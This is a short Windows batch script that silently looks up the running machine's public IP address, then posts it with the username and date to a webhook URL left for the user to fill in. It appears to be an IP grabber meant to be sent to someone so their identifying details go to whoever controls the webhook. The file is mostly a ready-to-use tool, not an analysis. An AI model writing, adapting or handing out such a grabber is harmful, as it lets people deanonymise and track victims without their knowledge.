set webhook=PASTEWEBHOOKHERE

@echo off
cls
for /f "tokens=" %%a in ('curl ifconfig.me -s') do (set publicip=%%a)
curl -d "contents=```Date:+%date%+|+Name: +%username%+|+IP:%publicip%```" -X POST %webhook%
exit 